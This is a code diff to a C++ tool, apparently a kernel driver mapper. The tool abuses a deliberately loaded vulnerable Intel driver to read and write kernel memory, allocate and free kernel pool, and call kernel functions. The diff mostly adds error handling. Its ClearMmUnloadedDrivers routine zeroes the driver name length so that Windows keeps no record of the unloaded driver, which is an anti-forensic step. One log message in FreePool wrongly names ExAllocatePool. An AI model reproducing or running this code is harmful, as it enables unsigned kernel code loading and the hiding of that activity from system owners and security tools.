@@ -48,8 +48,12 @@ void intel_driver::Unload(HANDLE device_handle)
 {
 	std::cout << "[<] Unloading vulnerable driver" << std::endl;
 
-	ClearMmUnloadedDrivers(device_handle);
-	CloseHandle(device_handle);
+	if (device_handle && device_handle != INVALID_HANDLE_VALUE) {
+		if (!ClearMmUnloadedDrivers(device_handle)) {
+			std::cout << "[-] Failed to clear MmUnloadedDrivers" << std::endl;
+		}
+		CloseHandle(device_handle);
+	}
 
 	service::StopAndRemove(driver_name);
 
@@ -193,10 +197,13 @@ uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_typ
 	if (!size)
 		return 0;
 
-	static uint64_t kernel_ExAllocatePool = 0;
+	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("ntoskrnl.exe"), "ExAllocatePool");
 
 	if (!kernel_ExAllocatePool)
-		kernel_ExAllocatePool = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("ntoskrnl.exe"), "ExAllocatePool");
+	{
+		std::cout << "[!] Failed to find ExAllocatePool" << std::endl;
+		return 0;
+	}
 
 	uint64_t allocated_pool = 0;
 
@@ -211,10 +218,12 @@ bool intel_driver::FreePool(HANDLE device_handle, uint64_t address)
 	if (!address)
 		return 0;
 
-	static uint64_t kernel_ExFreePool = 0;
+	static uint64_t kernel_ExFreePool = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("ntoskrnl.exe"), "ExFreePool");
 
-	if (!kernel_ExFreePool)
-		kernel_ExFreePool = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("ntoskrnl.exe"), "ExFreePool");
+	if (!kernel_ExFreePool) {
+		std::cout << "[!] Failed to find ExAllocatePool" << std::endl;
+		return 0;
+	}
 
 	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExFreePool, address);
 }
@@ -322,28 +331,38 @@ bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle)
 
 	uint64_t device_object = 0;
 
-	if (!ReadMemory(device_handle, object + 0x8, &device_object, sizeof(device_object)))
+	if (!ReadMemory(device_handle, object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
+		std::cout << "[!] Failed to find device_object" << std::endl;
 		return false;
+	}
 
 	uint64_t driver_object = 0;
 
-	if (!ReadMemory(device_handle, device_object + 0x8, &driver_object, sizeof(driver_object)))
+	if (!ReadMemory(device_handle, device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) {
+		std::cout << "[!] Failed to find driver_object" << std::endl;
 		return false;
+	}
 
 	uint64_t driver_section = 0;
-
-	if (!ReadMemory(device_handle, driver_object + 0x28, &driver_section, sizeof(driver_section)))
+	
+	if (!ReadMemory(device_handle, driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section) {
+		std::cout << "[!] Failed to find driver_section" << std::endl;
 		return false;
+	}
 
 	UNICODE_STRING us_driver_base_dll_name = { 0 };
 
-	if (!ReadMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
+	if (!ReadMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
+		std::cout << "[!] Failed to find driver name" << std::endl;
 		return false;
+	}
 
-	us_driver_base_dll_name.Length = 0;
+	us_driver_base_dll_name.Length = 0; //MiRememberUnloadedDriver will check if the length > 0 to save the unloaded driver
 
-	if (!WriteMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
+	if (!WriteMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
+		std::cout << "[!] Failed to write driver name length" << std::endl;
 		return false;
+	}
 
 	return true;
 }
